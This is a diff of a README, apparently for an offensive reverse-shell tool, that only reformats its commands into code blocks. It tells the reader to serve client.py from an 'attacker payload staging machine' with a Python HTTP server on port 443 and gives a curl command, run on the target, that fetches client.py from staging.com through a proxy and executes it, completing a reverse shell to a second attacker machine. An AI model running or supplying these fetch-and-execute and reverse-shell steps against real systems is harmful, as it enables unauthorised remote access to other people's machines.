@@ -26,11 +26,15 @@ python3 client.py
 
 In the directory where client.py exists on a separate attacker payload staging machine, run the following: 
 
-`sudo python3 -m http.server 443`
+```
+sudo python3 -m http.server 443
+```
 
 # Possible Initiation Methods
 
 On the target system run the following command to fetche the staged payload, then reach out to the listener hosted on a second attacker machine to complete the reverse shell.
 
-`curl --proxy proxy.example.com:8080 http://staging.com:443/client.py > client.py && python3 client.py`
+```
+curl --proxy proxy.example.com:8080 http://staging.com:443/client.py > client.py && python3 client.py
+```
 
